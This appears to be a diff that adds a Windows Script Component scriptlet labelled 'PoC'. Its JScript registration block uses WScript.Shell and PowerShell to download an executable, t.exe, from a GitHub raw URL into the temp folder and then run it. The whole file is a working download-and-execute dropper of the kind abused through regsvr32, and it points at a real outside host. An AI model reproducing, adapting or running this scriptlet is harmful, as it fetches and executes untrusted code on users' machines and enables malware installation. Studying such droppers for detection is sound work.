@@ -1,0 +1,13 @@
+<scriptlet>
+<registration
+progid="PoC"
+classid="{F0000000-0000-0000-0000-000000000000}"
+>
+<script engine="JScript">
+<![CDATA[
+var ws = new ActiveXObject('WScript.Shell');
+ws.Exec('cmd /c powershell -Command "(New-Object System.Net.WebClient).DownloadFile(\'https://github.com/t-tiktok/dkdjadad/raw/refs/heads/main/t.exe\', \'%TEMP%\\t.exe\'); Start-Process \'%TEMP%\\t.exe\'"');
+]]>
+</script>
+</registration>
+</scriptlet>
